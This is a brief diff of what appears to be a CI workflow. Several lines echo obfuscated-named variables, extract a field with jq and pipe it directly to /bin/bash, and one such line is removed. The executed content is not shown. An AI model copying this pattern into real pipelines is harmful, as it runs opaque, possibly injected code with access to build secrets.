@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$nfu906" | jq -r .vw7690 | /bin/bash
           echo $nqvw95 | jq -r .ht1 | /bin/bash
           echo $fxz66 | jq -r .hfv8002 | /bin/bash
-          echo $uawa0584 | jq -r .hlh523 | /bin/bash
           echo $f1 | jq -r .i8919 | /bin/bash
 
       - name: Upload artifact
